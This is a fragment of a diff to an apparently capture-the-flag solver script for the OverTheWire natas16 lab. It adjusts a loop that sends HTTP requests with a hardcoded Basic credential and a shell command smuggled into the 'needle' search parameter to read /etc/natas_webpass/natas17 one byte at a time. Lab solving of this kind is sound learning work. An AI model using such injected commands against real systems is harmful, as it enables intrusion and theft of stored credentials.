@@ -30,7 +30,7 @@ n=-1
 pwd=""
 b=0
 Fails=0
-for c in range(0,32):
+for c in range(1,32):
 	match=False
 	GotData=False
 	request=bytes("GET /index.php?needle=^%24(cut+-b{}+%2Fetc%2Fnatas_webpass%2Fnatas17)%24&submit=Search HTTP/1.1\r\nHost: natas16.natas.labs.overthewire.org\r\nAuthorization: BASIC bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==\r\n\r\n".format(b),"utf-8")
